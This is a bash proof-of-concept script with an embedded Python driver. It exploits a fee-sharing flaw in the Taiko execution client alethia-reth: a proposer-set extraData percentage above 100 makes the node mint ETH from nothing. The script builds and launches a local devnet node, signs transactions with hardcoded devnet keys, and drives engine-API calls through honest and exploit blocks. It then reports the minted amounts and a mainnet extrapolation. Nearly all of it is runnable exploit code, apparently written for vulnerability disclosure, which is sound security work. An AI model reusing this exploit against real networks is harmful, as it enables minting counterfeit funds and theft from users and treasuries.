#!/usr/bin/env bash
# =============================================================================
# PoC F#3 - one-shot - alethia-reth @ 0fb47d9 - base_fee_share_pctg > 100 mint
# A malicious proposer sets extraData[0] = 255; the executor pays the coinbase
# 2.55x the collected base fee; the difference is minted from thin air.
#
# Usage:   bash poc_f3_one_shot.sh            (run from the repo root)
# Env:     FORCE_BUILD=1  rebuild binary  |  AUTH_PORT/HTTP_PORT  change ports
# Output:  poc-evidence.json + before/after balance table (stdout)
# =============================================================================
set -euo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$REPO_ROOT"
[ -f Cargo.toml ] || { echo "run this from the alethia-reth repo root"; exit 1; }
command -v python3 >/dev/null || { echo "python3 is required"; exit 1; }

BIN="${BIN:-$REPO_ROOT/target/debug/alethia-reth}"
AUTH_PORT="${AUTH_PORT:-8551}"; HTTP_PORT="${HTTP_PORT:-8545}"
WORK="${WORK:-/tmp/taiko-poc-f3}"
export POC_AUTH_URL="http://127.0.0.1:$AUTH_PORT"
export POC_HTTP_URL="http://127.0.0.1:$HTTP_PORT"
export POC_WORK="$WORK"
export POC_JWT_FILE="$WORK/jwt.hex"
export POC_GT_KEY="${POC_GT_KEY:-0x92954368afd3caa1f3ce3ead0069c1af414054aefe1ef9aeacc1bf426222ce38}"

# --- 1. binary ---------------------------------------------------------------
if [ ! -x "$BIN" ] || [ "${FORCE_BUILD:-0}" = "1" ]; then
  echo "[*] building (dev profile; 30-60 min on 2 cores - swap must be enabled)..."
  cargo build --bin alethia-reth
fi

# --- 2. python dependency (pycryptodome for keccak) ---------------------------
python3 -c "import Crypto" 2>/dev/null || \
  python3 -m pip install --quiet pycryptodome 2>/dev/null || \
  python3 -m pip install --quiet --break-system-packages pycryptodome 2>/dev/null || \
  echo "[!] pycryptodome missing - driver will fail with install instructions"

# --- 3. environment ----------------------------------------------------------
rm -rf "$WORK"; mkdir -p "$WORK"
openssl rand -hex 32 | tr -d '\n' > "$POC_JWT_FILE"

# --- 4. attacker driver (embedded) -------------------------------------------
cat > "$WORK/poc_f3_driver.py" <<'PYEOF'
#!/usr/bin/env python3
"""
PoC driver for finding F#3 (base_fee_share_pctg > 100 -> value minted from thin air).

Replicates the exact production taiko-client driver flow for every L2 block:
  1. eth_sendRawTransaction        (user tx -> mempool)
  2. engine_forkchoiceUpdatedV2    (payload attributes; extraData[0] = pctg,
                                     chosen by the malicious proposer)
  3. engine_getPayloadV2           (node builds the block; the mint is already
                                     committed inside the resulting state root)
  4. engine_newPayloadV2           (node re-executes; deterministic; accepted)
  5. engine_forkchoiceUpdatedV2    (canonicalize the new head)

Requires: pycryptodome. Everything else is stdlib.
"""
import base64, hashlib, hmac, json, os, sys, time, urllib.request

AUTH_URL = os.environ.get("POC_AUTH_URL", "http://127.0.0.1:8551")
HTTP_URL = os.environ.get("POC_HTTP_URL", "http://127.0.0.1:8545")
JWT_FILE = os.environ.get("POC_JWT_FILE", "jwt.hex")
WORK     = os.environ.get("POC_WORK", ".")
GT_KEY   = int(os.environ.get("POC_GT_KEY",
    "0x92954368afd3caa1f3ce3ead0069c1af414054aefe1ef9aeacc1bf426222ce38"), 16)
USER_KEY = int(os.environ.get("POC_USER_KEY",
    "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80"), 16)  # anvil #0
ATK_KEY  = int(os.environ.get("POC_ATTACKER_KEY",
    "0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d"), 16)  # anvil #1

CHAIN_ID, TAIKO_MAINNET_ID = 167001, 167000
MIN_BF, MAINNET_MIN_BF, MAX_BF = 5_000_000, 10_000_000, 1_000_000_000
SHASTA_INITIAL, ELASTICITY, TBT, MGTP, DENOM = 25_000_000, 2, 2, 95, 8
ANCHOR_GAS, USER_GAS = 1_000_000, 21_000
BLOCK_GAS_LIMIT = 30_000_000

# Ground-truth constants (short hex; validated at startup by derivation):
GOLDEN_TOUCH     = bytes.fromhex("0000777735367b36bc9b61c50022d9d0700db4ec")  # addresses.rs
ANVIL0           = bytes.fromhex("f39fd6e51aad88f6f4ce6ab8827279cfffb92266")  # devnet alloc
ANVIL1           = bytes.fromhex("70997970c51812dc3a010c7d01b50e0d17dc79c8")  # devnet alloc
TREASURY_167001  = bytes.fromhex("1670010000000000000000000000000000010001")  # repo test vector
ZERO32 = "0x" + "00" * 32

try:
    from Crypto.Hash import keccak as _pyc_keccak
except ImportError:
    sys.exit("pycryptodome is required:  python3 -m pip install pycryptodome")

def keccak256(data):
    h = _pyc_keccak.new(digest_bits=256); h.update(data); return h.digest()

# ---- secp256k1 (pure python) ----
_P = 2**256 - 2**32 - 977
_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
_G = (0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798,
      0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8)

def _add(p, q):
    if p is None: return q
    if q is None: return p
    if p[0] == q[0] and (p[1] + q[1]) % _P == 0: return None
    if p == q:
        l = (3 * p[0] * p[0]) * pow(2 * p[1], -1, _P) % _P
    else:
        l = (q[1] - p[1]) * pow(q[0] - p[0], -1, _P) % _P
    x = (l * l - p[0] - q[0]) % _P
    return (x, (l * (p[0] - x) - p[1]) % _P)

def _mul(k, p):
    r = None
    while k:
        if k & 1: r = _add(r, p)
        p = _add(p, p); k >>= 1
    return r

def priv_to_addr(k):
    x, y = _mul(k, _G)
    return keccak256(x.to_bytes(32, "big") + y.to_bytes(32, "big"))[12:]

def sign(priv, z):
    while True:
        k = int.from_bytes(os.urandom(32), "big") % _N
        if not k: continue
        R = _mul(k, _G); r = R[0] % _N
        if not r: continue
        s = pow(k, -1, _N) * (z + r * priv) % _N
        if not s: continue
        yv = R[1] & 1
        if s > _N // 2:
            s = _N - s; yv ^= 1
        return r, s, yv

# ---- rlp + transactions ----
def _ei(n): return b"" if n == 0 else n.to_bytes((n.bit_length() + 7) // 8, "big")

def rlp(x):
    if isinstance(x, bytes):
        if len(x) == 1 and x[0] < 0x80: return x
        if len(x) < 56: return bytes([0x80 + len(x)]) + x
        h = _ei(len(x)); return bytes([0xB7 + len(h)]) + h + x
    b = b"".join(rlp(i) for i in x)
    if len(b) < 56: return bytes([0xC0 + len(b)]) + b
    h = _ei(len(b)); return bytes([0xF7 + len(h)]) + h + b

def legacy(k, nonce, gas_price, gas, to, value, data, cid):
    # signed legacy tx = [nonce, gasPrice, gas, to, value, data, v, r, s]  (9 fields)
    core = [_ei(nonce), _ei(gas_price), _ei(gas), to, _ei(value), data, _ei(cid), b"", b""]
    z = int.from_bytes(keccak256(rlp(core)), "big"); r, s, v = sign(k, z)
    return rlp(core[:6] + [_ei(35 + 2 * cid + v), _ei(r), _ei(s)])

def eip1559(k, cid, nonce, prio, maxfee, gas, to, value, data):
    core = [_ei(cid), _ei(nonce), _ei(prio), _ei(maxfee), _ei(gas), to,
            _ei(value), data, []]
    z = int.from_bytes(keccak256(b"\x02" + rlp(core)), "big"); r, s, v = sign(k, z)
    return b"\x02" + rlp(core + [_ei(v), _ei(r), _ei(s)])

# ---- taiko helpers ----
def treasury(cid):
    return bytes.fromhex(str(cid) + "0" * (40 - len(str(cid)) - 5) + "10001")

SEL_V4 = keccak256(b"anchorV4((uint48,bytes32,bytes32))")[:4]

def anchor_data():
    # static tuple -> inline encoding: selector + uint48 + bytes32 + bytes32
    return SEL_V4 + b"\x00" * 96

def next_bf(gl, gu, bf, dt):
    """Exact integer replica of calculate_next_block_eip4396_base_fee."""
    mn = MAINNET_MIN_BF if CHAIN_ID == TAIKO_MAINNET_ID else MIN_BF
    bt = gl // ELASTICITY
    adj = min(bt * dt // TBT, gl * MGTP // 100)
    if gu > adj:
        bf = bf + max(bf * (gu - adj) // bt // DENOM, 1)
    elif gu < adj:
        bf = bf - bf * (adj - gu) // bt // DENOM
    return max(mn, min(bf, MAX_BF))

# ---- rpc ----
def jwt(secret):
    s = bytes.fromhex(secret.strip().removeprefix("0x"))
    b64 = lambda x: base64.urlsafe_b64encode(x).rstrip(b"=")
    t = int(time.time())
    h = b64(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    p = b64(json.dumps({"iat": t, "exp": t + 300}, separators=(",", ":")).encode())
    return (h + b"." + p + b"." + b64(hmac.new(s, h + b"." + p, hashlib.sha256).digest())).decode()

class RPC:
    def __init__(s, url, jwt_file=None):
        s.u = url
        s.j = (open(jwt_file).read().strip() if jwt_file else None)
        s.i = 0
    def call(s, m, ps=None):
        s.i += 1
        rq = urllib.request.Request(s.u, data=json.dumps({"jsonrpc": "2.0", "id": s.i,
            "method": m, "params": ps if ps is not None else []}).encode(),
            headers={"Content-Type": "application/json"})
        if s.j: rq.add_header("Authorization", "Bearer " + jwt(s.j))
        with urllib.request.urlopen(rq, timeout=180) as r:
            o = json.loads(r.read())
        if "error" in o: raise RuntimeError(f"{m}: {o['error']}")
        return o["result"]

def bal(w, a): return int(w.call("eth_getBalance", ["0x" + a.hex(), "latest"]), 16)

# ---- startup self-test (ground-truth based; no hardcoded hashes) ----
def self_test():
    assert priv_to_addr(GT_KEY) == GOLDEN_TOUCH, \
        "golden touch key does not derive to the on-chain address"
    assert priv_to_addr(USER_KEY) == ANVIL0, "user key does not derive to anvil#0"
    assert priv_to_addr(ATK_KEY) == ANVIL1, "attacker key does not derive to anvil#1"
    assert treasury(CHAIN_ID) == TREASURY_167001, "treasury address mismatch"
    assert rlp(b"") == b"\x80"
    assert rlp(b"dog") == b"\x83dog"
    assert rlp([]) == b"\xc0"
    assert rlp([b"cat", b"dog"]) == b"\xc8\x83cat\x83dog"
    x56 = bytes(range(56))
    assert rlp(x56) == bytes([0xB8, 56]) + x56
    print("[+] self-test passed: keccak/secp256k1/rlp validated via ground-truth addresses")

# ---- one attack block ----
def drive(eng, web, st, k, label, pctg):
    user, atk, tr = k["u"], k["a"], k["t"]
    par = web.call("eth_getBlockByNumber", [hex(st["n"]), False])
    n = st["n"] + 1
    if n == 1:
        bf = SHASTA_INITIAL            # parent.number()==0 branch (fail-closed)
    else:
        gp = web.call("eth_getBlockByNumber", [hex(n - 2), False])
        bf = next_bf(int(par["gasLimit"], 16), int(par["gasUsed"], 16),
                     int(par["baseFeePerGas"], 16),
                     int(par["timestamp"], 16) - int(gp["timestamp"], 16))
    ts = int(par["timestamp"], 16) + 2
    b0 = {x: bal(web, a) for x, a in (("atk", atk), ("tr", tr), ("user", user))}

    # 1) user tx (legacy, gasPrice == baseFee -> tip 0, pays exactly F)
    un = int(web.call("eth_getTransactionCount", ["0x" + user.hex(), "latest"]), 16)
    raw_u = legacy(k["uk"], un, bf, USER_GAS, atk, 0, b"", CHAIN_ID)
    txh = web.call("eth_sendRawTransaction", ["0x" + raw_u.hex()])
    for _ in range(20):
        try:
            if int(web.call("txpool_status")["pending"], 16) >= 1: break
        except Exception: break
        time.sleep(0.5)

    # 2) anchor tx (EIP-1559, golden touch -> treasury, tip 0, gas 1M)
    gn = int(web.call("eth_getTransactionCount", ["0x" + GOLDEN_TOUCH.hex(), "latest"]), 16)
    raw_a = eip1559(GT_KEY, CHAIN_ID, gn, 0, 2 * bf, ANCHOR_GAS, tr, 0, anchor_data())

    # 3) FCU with attacker-controlled attributes (== production driver per block)
    extra = bytes([pctg]) + n.to_bytes(6, "big")     # [pctg || proposalId(6)]
    attrs = {
        "timestamp": hex(ts),
        "prevRandao": "0x" + "11" * 32,
        "suggestedFeeRecipient": "0x" + atk.hex(),
        "withdrawals": [],
        "parentBeaconBlockRoot": ZERO32,
        "baseFeePerGas": hex(bf),
        "blockMetadata": {
            "beneficiary": "0x" + atk.hex(),
            "gasLimit": BLOCK_GAS_LIMIT,   # u64 -> PLAIN JSON NUMBER (not hex!)
            "timestamp": hex(ts),
            "mixHash": "0x" + "22" * 32,
            "extraData": base64.b64encode(extra).decode(),
        },
        "l1Origin": {
            "blockId": hex(n),
            "l2BlockHash": par["hash"],
            "l1BlockHeight": "0x1",
            "l1BlockHash": ZERO32,
            "buildPayloadArgsID": [0] * 8,
            "isForcedInclusion": False,
            "signature": "0x" + "00" * 65,
        },
        "anchorTransaction": "0x" + raw_a.hex(),
    }
    r = eng.call("engine_forkchoiceUpdatedV2",
        [{"headBlockHash": par["hash"], "safeBlockHash": par["hash"],
          "finalizedBlockHash": st["g"]}, attrs])
    assert r["payloadStatus"]["status"] == "VALID", r
    pid = r["payloadId"]

    # 4) getPayload (retry while building)
    env = None
    for _ in range(60):
        try:
            env = eng.call("engine_getPayloadV2", [pid]); break
        except RuntimeError: time.sleep(1)
    assert env, "getPayload timeout (builder likely failed - see node.log)"
    P, BV = env["executionPayload"], env["blockValue"]
    assert P["extraData"] == "0x" + extra.hex(), P["extraData"]
    assert int(P["baseFeePerGas"], 16) == bf
    assert P["transactions"][0] == "0x" + raw_a.hex(), "anchor is not the first tx"
    assert P["transactions"][1] == "0x" + raw_u.hex(), "user tx missing from payload"

    # 5) newPayload (echo + sidecar; headerDifficulty == blockValue for Unzen)
    stt = eng.call("engine_newPayloadV2", [{**P, "txHash": ZERO32,
        "withdrawalsHash": ZERO32, "headerDifficulty": BV, "taikoBlock": True}])
    assert stt["status"] == "VALID", stt

    # 6) canonicalize
    eng.call("engine_forkchoiceUpdatedV2",
        [{"headBlockHash": P["blockHash"], "safeBlockHash": P["blockHash"],
          "finalizedBlockHash": st["g"]}, None])
    for _ in range(120):
        if int(web.call("eth_getBlockByNumber", ["latest", False])["number"], 16) >= n:
            break
        time.sleep(0.5)

    # 7) measure (before/after)
    rcpt = None
    for _ in range(20):
        rcpt = web.call("eth_getTransactionReceipt", [txh])
        if rcpt: break
        time.sleep(0.5)
    assert rcpt and rcpt["status"] == "0x1", "user tx did not succeed"
    F = bf * int(rcpt["gasUsed"], 16)
    b1 = {x: bal(web, a) for x, a in (("atk", atk), ("tr", tr), ("user", user))}
    d = {x: b1[x] - b0[x] for x in b0}
    exp = {"atk": F * pctg // 100, "tr": max(F - F * pctg // 100, 0), "user": -F}
    minted = d["atk"] + d["tr"] + d["user"]
    ok = all(d[x] == exp[x] for x in d)
    print(f"\n=== BLOCK {n} [{label}]  pctg={pctg}  baseFee={bf}  F={F} wei ===")
    for x in ("atk", "tr", "user"):
        print(f"  delta {x:4s} = {d[x]:>18d}   (formula {exp[x]:>18d})  "
              f"{'OK' if d[x] == exp[x] else 'MISMATCH'}")
    print(f"  SUM of deltas (conservation) = {minted} wei  "
          f"{'-> CONSERVED (honest)' if minted == 0 else '-> MINTED FROM THIN AIR'}")
    st["n"], st["h"] = n, P["blockHash"]
    return {"block": n, "label": label, "pctg": pctg, "baseFee": bf, "F": F,
            "deltas": d, "expected": exp, "minted": minted, "match": ok,
            "blockHash": P["blockHash"], "userTx": txh,
            "extraData": P["extraData"], "stateRoot": P["stateRoot"]}

def main():
    self_test()
    web = RPC(HTTP_URL)
    for _ in range(120):
        try:
            cid = int(web.call("eth_chainId"), 16); break
        except Exception: time.sleep(1)
    else:
        raise RuntimeError("HTTP RPC not ready after 120s")
    assert cid == CHAIN_ID, f"chain id {cid}, expected {CHAIN_ID} (--chain devnet)"
    eng = RPC(AUTH_URL, JWT_FILE)
    k = {"uk": USER_KEY, "u": priv_to_addr(USER_KEY), "a": priv_to_addr(ATK_KEY),
         "t": treasury(CHAIN_ID)}
    print(f"[+] chain {cid} | treasury 0x{k['t'].hex()}")
    print(f"[+] user 0x{k['u'].hex()} | attacker/coinbase 0x{k['a'].hex()}")
    print(f"[+] golden touch balance: {bal(web, GOLDEN_TOUCH)} wei "
          f"(anchor is balance-exempt in this client; informational)")
    g = web.call("eth_getBlockByNumber", ["0x0", False])
    st = {"n": 0, "g": g["hash"]}
    print(f"[+] genesis {g['hash']}\n")

    res = [drive(eng, web, st, k, "control (honest)", 50)]
    res += [drive(eng, web, st, k, "exploit", 255) for _ in range(3)]

    tot = sum(r["minted"] for r in res)
    print("\n" + "=" * 76)
    print("SUMMARY (wei):")
    for r in res:
        tag = "CONSERVED" if r["minted"] == 0 else f"+{r['minted']} MINTED"
        print(f"  blk {r['block']} pctg={r['pctg']:>3}: "
              f"atk {r['deltas']['atk']:>+18d} | "
              f"tr {r['deltas']['tr']:>+18d} | "
              f"user {r['deltas']['user']:>+18d} | {tag}")
    print(f"\n  TOTAL minted from thin air (3 exploit blocks): {tot} wei "
          f"({tot / 1e18:.9f} ETH)")
    print(f"  Mainnet extrapolation (0.01 gwei base fee, 2s blocks, full 30M gas): "
          f"~{1.55 * 10_000_000 * 29e6 * 43_200 / 1e18:.1f} ETH/day minted; "
          f"treasury share zeroed.")
    print("  Minted ETH is indistinguishable from real ETH and bridgeable L2->L1.")
    json.dump(res, open(os.path.join(WORK, "poc-evidence.json"), "w"), indent=2)
    print(f"\n[+] evidence: {os.path.join(WORK, 'poc-evidence.json')}")
    sys.exit(0 if all(r["match"] for r in res) else 1)

main()
PYEOF

# --- 5. launch node ----------------------------------------------------------
NODE_PID=""
cleanup(){ [ -n "$NODE_PID" ] && kill "$NODE_PID" 2>/dev/null || true; }
trap cleanup EXIT
echo "[*] launching node (devnet, fresh datadir $WORK/datadir)..."
"$BIN" node --chain devnet --datadir "$WORK/datadir" \
  --authrpc.addr 127.0.0.1 --authrpc.port "$AUTH_PORT" \
  --authrpc.jwtsecret "$POC_JWT_FILE" \
  --http --http.addr 127.0.0.1 --http.port "$HTTP_PORT" \
  --http.api eth,net,web3,txpool > "$WORK/node.log" 2>&1 &
NODE_PID=$!

# --- 6. run attack -----------------------------------------------------------
echo "[*] running attack (driver waits for RPC readiness itself)..."
if python3 "$WORK/poc_f3_driver.py"; then
  echo
  echo "[+] PoC COMPLETE - control: conserved | exploit: MINT - see table above."
  cp "$WORK/poc-evidence.json" "$REPO_ROOT/poc-evidence.json" 2>/dev/null || true
  exit 0
else
  echo
  echo "[!] PoC FAILED - last 60 lines of node log:"
  tail -60 "$WORK/node.log"
  exit 1
fi
